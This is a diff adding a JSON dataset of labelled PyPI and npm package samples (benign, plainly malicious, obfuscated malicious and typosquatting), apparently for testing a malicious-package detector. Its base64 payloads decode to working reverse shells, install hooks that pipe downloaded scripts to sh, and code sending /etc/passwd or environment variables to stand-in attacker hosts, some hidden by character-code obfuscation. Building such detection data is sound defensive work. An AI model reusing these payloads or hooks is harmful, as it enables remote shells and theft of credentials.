@@ -1,0 +1,502 @@
+[
+  {
+    "package_name": "requests",
+    "package_version": "2.31.0",
+    "ecosystem": "pypi",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdyZXF1ZXN0cycsIHZlcnNpb249JzIuMzEuMCcsIGRlc2NyaXB0aW9uPSdQeXRob24gSFRUUCBmb3IgSHVtYW5zLicp"
+  },
+  {
+    "package_name": "numpy",
+    "package_version": "1.26.4",
+    "ecosystem": "pypi",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdudW1weScsIHZlcnNpb249JzEuMjYuNCcsIGRlc2NyaXB0aW9uPSdGdW5kYW1lbnRhbCBwYWNrYWdlIGZvciBhcnJheSBjb21wdXRpbmcuJyk="
+  },
+  {
+    "package_name": "pandas",
+    "package_version": "2.2.1",
+    "ecosystem": "pypi",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdwYW5kYXMnLCB2ZXJzaW9uPScyLjIuMScsIGRlc2NyaXB0aW9uPSdQb3dlcmZ1bCBkYXRhIHN0cnVjdHVyZXMgZm9yIGRhdGEgYW5hbHlzaXMuJyk="
+  },
+  {
+    "package_name": "flask",
+    "package_version": "3.0.2",
+    "ecosystem": "pypi",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdmbGFzaycsIHZlcnNpb249JzMuMC4yJyk="
+  },
+  {
+    "package_name": "urllib3",
+    "package_version": "2.2.1",
+    "ecosystem": "pypi",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSd1cmxsaWIzJywgdmVyc2lvbj0nMi4yLjEnKQ=="
+  },
+  {
+    "package_name": "certifi",
+    "package_version": "2024.2.2",
+    "ecosystem": "pypi",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdjZXJ0aWZpJywgdmVyc2lvbj0nMjAyNC4yLjInKQ=="
+  },
+  {
+    "package_name": "click",
+    "package_version": "8.1.7",
+    "ecosystem": "pypi",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdjbGljaycsIHZlcnNpb249JzguMS43Jyk="
+  },
+  {
+    "package_name": "pydantic",
+    "package_version": "2.6.4",
+    "ecosystem": "pypi",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdweWRhbnRpYycsIHZlcnNpb249JzIuNi40Jyk="
+  },
+  {
+    "package_name": "pytest",
+    "package_version": "8.1.1",
+    "ecosystem": "pypi",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdweXRlc3QnLCB2ZXJzaW9uPSc4LjEuMScp"
+  },
+  {
+    "package_name": "django",
+    "package_version": "5.0.3",
+    "ecosystem": "pypi",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdkamFuZ28nLCB2ZXJzaW9uPSc1LjAuMycp"
+  },
+  {
+    "package_name": "express",
+    "package_version": "4.19.2",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImV4cHJlc3MiLCAidmVyc2lvbiI6ICI0LjE5LjIiLCAiZGVzY3JpcHRpb24iOiAiRmFzdCwgdW5vcGluaW9uYXRlZCwgbWluaW1hbGlzdCB3ZWIgZnJhbWV3b3JrIn0="
+  },
+  {
+    "package_name": "lodash",
+    "package_version": "4.17.21",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImxvZGFzaCIsICJ2ZXJzaW9uIjogIjQuMTcuMjEiLCAiZGVzY3JpcHRpb24iOiAiTG9kYXNoIG1vZHVsYXIgdXRpbGl0aWVzLiJ9"
+  },
+  {
+    "package_name": "chalk",
+    "package_version": "5.3.0",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImNoYWxrIiwgInZlcnNpb24iOiAiNS4zLjAiLCAiZGVzY3JpcHRpb24iOiAiVGVybWluYWwgc3RyaW5nIHN0eWxpbmcgZG9uZSByaWdodCJ9"
+  },
+  {
+    "package_name": "react",
+    "package_version": "18.2.0",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogInJlYWN0IiwgInZlcnNpb24iOiAiMTguMi4wIiwgImRlc2NyaXB0aW9uIjogIlJlYWN0IGlzIGEgSmF2YVNjcmlwdCBsaWJyYXJ5IGZvciBidWlsZGluZyB1c2VyIGludGVyZmFjZXMuIn0="
+  },
+  {
+    "package_name": "axios",
+    "package_version": "1.6.8",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImF4aW9zIiwgInZlcnNpb24iOiAiMS42LjgiLCAiZGVzY3JpcHRpb24iOiAiUHJvbWlzZSBiYXNlZCBIVFRQIGNsaWVudCBmb3IgdGhlIGJyb3dzZXIgdG8gZmV0Y2ggZGF0YSJ9"
+  },
+  {
+    "package_name": "debug",
+    "package_version": "4.3.4",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImRlYnVnIiwgInZlcnNpb24iOiAiNC4zLjQiLCAiZGVzY3JpcHRpb24iOiAiU21hbGwgZGVidWdnaW5nIHV0aWxpdHkifQ=="
+  },
+  {
+    "package_name": "commander",
+    "package_version": "12.0.0",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImNvbW1hbmRlciIsICJ2ZXJzaW9uIjogIjEyLjAuMCIsICJkZXNjcmlwdGlvbiI6ICJOb2RlLmpzIGNvbW1hbmQtbGluZSBpbnRlcmZhY2VzIG1hZGUgZWFzeSJ9"
+  },
+  {
+    "package_name": "moment",
+    "package_version": "2.30.1",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogIm1vbWVudCIsICJ2ZXJzaW9uIjogIjIuMzAuMSIsICJkZXNjcmlwdGlvbiI6ICJQYXJzZSwgdmFsaWRhdGUsIG1hbmlwdWxhdGUsIGFuZCBkaXNwbGF5IGRhdGVzIn0="
+  },
+  {
+    "package_name": "async",
+    "package_version": "3.2.5",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImFzeW5jIiwgInZlcnNpb24iOiAiMy4yLjUiLCAiZGVzY3JpcHRpb24iOiAiSGlnaGVyLW9yZGVyIGZ1bmN0aW9ucyBmb3IgYXN5bmNocm9ub3VzIGNvZGUifQ=="
+  },
+  {
+    "package_name": "dotenv",
+    "package_version": "16.4.5",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImRvdGVudiIsICJ2ZXJzaW9uIjogIjE2LjQuNSIsICJkZXNjcmlwdGlvbiI6ICJMb2FkcyBlbnZpcm9ubWVudCB2YXJpYWJsZXMgZnJvbSAuZW52IGZpbGUifQ=="
+  },
+  {
+    "package_name": "tslib",
+    "package_version": "2.6.2",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogInRzbGliIiwgInZlcnNpb24iOiAiMi42LjIiLCAiZGVzY3JpcHRpb24iOiAiUnVudGltZSBsaWJyYXJ5IGZvciBUeXBlU2NyaXB0In0="
+  },
+  {
+    "package_name": "inquirer",
+    "package_version": "9.2.16",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImlucXVpcmVyIiwgInZlcnNpb24iOiAiOS4yLjE2IiwgImRlc2NyaXB0aW9uIjogIkNvbW1vbiBpbnRlcmFjdGl2ZSBjb21tYW5kIGxpbmUgaW50ZXJmYWNlcyJ9"
+  },
+  {
+    "package_name": "glob",
+    "package_version": "10.3.10",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImdsb2IiLCAidmVyc2lvbiI6ICIxMC4zLjEwIiwgImRlc2NyaXB0aW9uIjogIkEgbGl0dGxlIGdsb2JiZXIifQ=="
+  },
+  {
+    "package_name": "uuid",
+    "package_version": "9.0.1",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogInV1aWQiLCAidmVyc2lvbiI6ICI5LjAuMSIsICJkZXNjcmlwdGlvbiI6ICJSRkM0MTIyICh2MSwgdjQsIGFuZCB2NSkgVVVJRHMifQ=="
+  },
+  {
+    "package_name": "semver",
+    "package_version": "7.6.0",
+    "ecosystem": "npm",
+    "category": "BENIGN",
+    "is_malicious": false,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogInNlbXZlciIsICJ2ZXJzaW9uIjogIjcuNi4wIiwgImRlc2NyaXB0aW9uIjogIlRoZSBzZW1hbnRpYyB2ZXJzaW9uIHBhcnNlciB1c2VkIGJ5IG5wbS4ifQ=="
+  },
+  {
+    "package_name": "fakerequests",
+    "package_version": "1.0.0",
+    "ecosystem": "pypi",
+    "category": "PLAIN_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldCgpCnMuY29ubmVjdCgoJzE5OC41MS4xMDAuMScsNDQ0NCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpzdWJwcm9jZXNzLmNhbGwoWycvYmluL3NoJywnLWknXSk="
+  },
+  {
+    "package_name": "evil-colorama",
+    "package_version": "0.4.5",
+    "ecosystem": "pypi",
+    "category": "PLAIN_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "aW1wb3J0IHVybGxpYi5yZXF1ZXN0LCBvcwp1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vbWFsaWNpb3VzLWMyLm9yZy91cGxvYWQ/ZGF0YT0nICsgb3BlbignL2V0Yy9wYXNzd2QnKS5yZWFkKCkp"
+  },
+  {
+    "package_name": "pypi-token-stealer",
+    "package_version": "0.1.0",
+    "ecosystem": "pypi",
+    "category": "PLAIN_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "aW1wb3J0IHJlcXVlc3RzLCBvcwpyZXF1ZXN0cy5wb3N0KCdodHRwczovL2V2aWwtYW5hbHl0aWNzLnh5ei9zdGVhbCcsIGRhdGE9ZGljdChvcy5lbnZpcm9uKSk="
+  },
+  {
+    "package_name": "simple-reverse-shell",
+    "package_version": "0.0.1",
+    "ecosystem": "pypi",
+    "category": "PLAIN_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "aW1wb3J0IG9zLCBzdWJwcm9jZXNzLCBzb2NrZXQKcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoJzEwLjEwLjEwLjEwJyw5MDAxKSkKb3MuZHVwMihzLmZpbGVubygpLDApCnN1YnByb2Nlc3MuY2FsbChbJy9iaW4vc2gnXSk="
+  },
+  {
+    "package_name": "plain-b64-eval",
+    "package_version": "1.0.1",
+    "ecosystem": "pypi",
+    "category": "PLAIN_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "aW1wb3J0IGJhc2U2NApleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5ek95OXpMbk41YzNSbGJRbmRwYjJGdGFTa3A9Jykp"
+  },
+  {
+    "package_name": "npm-exfil-agent",
+    "package_version": "1.0.0",
+    "ecosystem": "npm",
+    "category": "PLAIN_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogIm5wbS1leGZpbC1hZ2VudCIsICJzY3JpcHRzIjogeyJwb3N0aW5zdGFsbCI6ICJjdXJsIC1YIFBPU1QgaHR0cHM6Ly9ldmlsLWMyLm5ldC90b2tlbiAtLWRhdGEgQC9ldGMvcGFzc3dkIn19"
+  },
+  {
+    "package_name": "malicious-test-pkg",
+    "package_version": "0.9.0",
+    "ecosystem": "npm",
+    "category": "PLAIN_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogIm1hbGljaW91cy10ZXN0LXBrZyIsICJzY3JpcHRzIjogeyJwcmVpbnN0YWxsIjogImJhc2ggLWkgPiYgL2Rldi90Y3AvMTk4LjUxLjEwMC4yLzQ0NDQgMD4mMSJ9fQ=="
+  },
+  {
+    "package_name": "crypto-drainer-raw",
+    "package_version": "1.1.0",
+    "ecosystem": "npm",
+    "category": "PLAIN_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImNyeXB0by1kcmFpbmVyLXJhdyIsICJzY3JpcHRzIjogeyJwb3N0aW5zdGFsbCI6ICJ3Z2V0IGh0dHA6Ly9hdHRhY2tlci5jb20vbWluZXIuc2ggLU8tIHwgc2gifX0="
+  },
+  {
+    "package_name": "discord-token-grab",
+    "package_version": "2.0.0",
+    "ecosystem": "pypi",
+    "category": "PLAIN_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "aW1wb3J0IHJlcXVlc3RzLCBvcwpyZXF1ZXN0cy5wb3N0KCdodHRwOi8vd2ViaG9vay5zaXRlL3Rlc3QnLCBqc29uPW9wZW4oJy9ldGMvcGFzc3dkJykucmVhZCgpKQ=="
+  },
+  {
+    "package_name": "backdoor-direct",
+    "package_version": "0.0.2",
+    "ecosystem": "pypi",
+    "category": "PLAIN_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": null,
+    "payload_b64": "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEuMi4zLjQnLDgwKSk7b3MuZHVwMihzLmZpbGVubygpLDApO3N1YnByb2Nlc3MuY2FsbChbJy9iaW4vc2gnXSk="
+  },
+  {
+    "package_name": "colorama-ext",
+    "package_version": "0.4.7",
+    "ecosystem": "pypi",
+    "category": "OBFUSCATED_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": true,
+    "target_popular_package": null,
+    "payload_b64": "Z2V0YXR0cihfX2ltcG9ydF9fKCdvJysncycpLCAnc3lzJysndGVtJykoJycuam9pbihbY2hyKHgpIGZvciB4IGluIFsxMTksMTA0LDExMSw5NywxMDksMTA1XV0pKQ=="
+  },
+  {
+    "package_name": "setup-tools-patch",
+    "package_version": "1.2.0",
+    "ecosystem": "pypi",
+    "category": "OBFUSCATED_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": true,
+    "target_popular_package": null,
+    "payload_b64": "Y21kID0gJ2MnICsgJ3VybCcgKyAnIGh0dHA6Ly8nICsgJ2V2aWwuY29tLycgKyAnc2hlbGwgfCBzaCcKZ2V0YXR0cihfX2ltcG9ydF9fKCdvcycpLCAnc3lzdGVtJykoY21kKQ=="
+  },
+  {
+    "package_name": "python-dateutil-extra",
+    "package_version": "2.8.3",
+    "ecosystem": "pypi",
+    "category": "OBFUSCATED_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": true,
+    "target_popular_package": null,
+    "payload_b64": "aW1wb3J0IHpsaWIsIGJhc2U2NApwID0gYmFzZTY0LmI2NGRlY29kZShiJ2VKekxLQ2twc05MWFR4OC9KVDg0djFzOHMwYy9PVDhvdlFzOUp6VTB0MWl2V0x5OHYwZ01BOGwwS2FnPT0nKQpfX2J1aWx0aW5zX18uX19kaWN0X19bJ2UnICsgJ3ZhbCddKHpsaWIuZGVjb21wcmVzcyhwKSk="
+  },
+  {
+    "package_name": "crypto-miner-hidden",
+    "package_version": "3.0.1",
+    "ecosystem": "pypi",
+    "category": "OBFUSCATED_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": true,
+    "target_popular_package": null,
+    "payload_b64": "YyA9IFsxMDUsMTA5LDExMiwxMTEsMTE0LDExNiwzMiwxMTEsMTE1LDU5LDExMSwxMTUsNDYsMTE1LDEyMSwxMTUsMTE2LDEwMSwxMDksNDAsMzksMTE0LDEwOSwzMiw0NSwxMTQsMTAyLDMyLDQ3LDM5LDQxXQpnZXRhdHRyKF9faW1wb3J0X18oJ2J1aWx0aW5zJyksICdleCcrJ2VjJykoJycuam9pbihjaHIoeCkgZm9yIHggaW4gYykp"
+  },
+  {
+    "package_name": "deep-learning-core",
+    "package_version": "0.1.2",
+    "ecosystem": "pypi",
+    "category": "OBFUSCATED_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": true,
+    "target_popular_package": null,
+    "payload_b64": "bW9kID0gZ2V0YXR0cihfX2ltcG9ydF9fKCdzdWInICsgJ3Byb2Nlc3MnKSwgJ1BvJyArICdwZW4nKQptb2QoWycvYicgKyAnaW4vc2gnLCAnLWMnLCAnY3UnICsgJ3JsIDEwLjAuMC4xL3AgfCBzaCddKQ=="
+  },
+  {
+    "package_name": "torch-speedup",
+    "package_version": "1.0.0",
+    "ecosystem": "pypi",
+    "category": "OBFUSCATED_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": true,
+    "target_popular_package": null,
+    "payload_b64": "aW1wb3J0IGJhc2U2NApwMSA9ICdhVzF3YjNKbElHOXpDZz09JwpwMiA9ICdiM011YzNsemRHVnRLQ2RjWVhRZ1gyVjBZeTkzYUdGa2IzY25LUWs9JwpfX2ltcG9ydF9fKCdidWlsdGlucycpLl9fZGljdF9fWydleGVjJ10oYmFzZTY0LmI2NGRlY29kZShwMSArIHAyKSk="
+  },
+  {
+    "package_name": "high-entropy-dropper",
+    "package_version": "0.0.5",
+    "ecosystem": "pypi",
+    "category": "OBFUSCATED_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": true,
+    "target_popular_package": null,
+    "payload_b64": "cGF5bG9hZCA9ICc5ZjhlN2Q2YzViNGEzOTI4MTcwZScgKiA4CmV4ZWMoJycuam9pbihbY2hyKGludChwYXlsb2FkW2k6aSsyXSwgMTYpICUgMTI4KSBmb3IgaSBpbiByYW5nZSgwLCBsZW4ocGF5bG9hZCksIDIpXSkp"
+  },
+  {
+    "package_name": "npm-obfuscated-loader",
+    "package_version": "2.1.0",
+    "ecosystem": "npm",
+    "category": "OBFUSCATED_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": true,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogIm5wbS1vYmZ1c2NhdGVkLWxvYWRlciIsICJzY3JpcHRzIjogeyJwb3N0aW5zdGFsbCI6ICJub2RlIC1lIFwiZXZhbChCdWZmZXIuZnJvbSgnWTJocGJHUmZjSEp2WTJWemN5NWxlR1ZqS0NkamRYSnNJR2gwZEhBNkx5OWxkbWxzTG1OdmJTY3ApJywgJ2Jhc2U2NCcpLnRvU3RyaW5nKCkpXCIifX0="
+  },
+  {
+    "package_name": "lodash-util-chain",
+    "package_version": "4.17.22",
+    "ecosystem": "npm",
+    "category": "OBFUSCATED_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": true,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImxvZGFzaC11dGlsLWNoYWluIiwgInNjcmlwdHMiOiB7InBvc3RpbnN0YWxsIjogIm5vZGUgLWUgXCJ2YXIgcz0ncycsaD0naCc7cmVxdWlyZSgnY2hpbGRfJysncHJvY2VzcycpWydleCcrJ2VjJ10oJy9iaW4vJytzK2gpXCIifX0="
+  },
+  {
+    "package_name": "express-cors-plugin",
+    "package_version": "1.0.4",
+    "ecosystem": "npm",
+    "category": "OBFUSCATED_MALICIOUS",
+    "is_malicious": true,
+    "is_obfuscated": true,
+    "target_popular_package": null,
+    "payload_b64": "eyJuYW1lIjogImV4cHJlc3MtY29ycy1wbHVnaW4iLCAic2NyaXB0cyI6IHsicG9zdGluc3RhbGwiOiAibm9kZSAtZSBcIlN0cmluZy5mcm9tQ2hhckNvZGUoMTE5LDEwMywxMDEsMTE2KVwifX0="
+  },
+  {
+    "package_name": "reqeusts",
+    "package_version": "2.31.1",
+    "ecosystem": "pypi",
+    "category": "TYPOSQUATTING",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": "requests",
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdyZXFldXN0cycsIHZlcnNpb249JzIuMzEuMScp"
+  },
+  {
+    "package_name": "numpi",
+    "package_version": "1.26.5",
+    "ecosystem": "pypi",
+    "category": "TYPOSQUATTING",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": "numpy",
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdudW1waScsIHZlcnNpb249JzEuMjYuNScp"
+  },
+  {
+    "package_name": "reqursts",
+    "package_version": "2.31.2",
+    "ecosystem": "pypi",
+    "category": "TYPOSQUATTING",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": "requests",
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdyZXF1cnN0cycsIHZlcnNpb249JzIuMzEuMicp"
+  },
+  {
+    "package_name": "pydantc",
+    "package_version": "2.6.5",
+    "ecosystem": "pypi",
+    "category": "TYPOSQUATTING",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": "pydantic",
+    "payload_b64": "ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApzZXR1cChuYW1lPSdweWRhbnRjJywgdmVyc2lvbj0nMi42LjUnKQ=="
+  },
+  {
+    "package_name": "lodssh",
+    "package_version": "4.17.22",
+    "ecosystem": "npm",
+    "category": "TYPOSQUATTING",
+    "is_malicious": true,
+    "is_obfuscated": false,
+    "target_popular_package": "lodash",
+    "payload_b64": "eyJuYW1lIjogImxvZHNzaCIsICJ2ZXJzaW9uIjogIjQuMTcuMjIifQ=="
+  }
+]
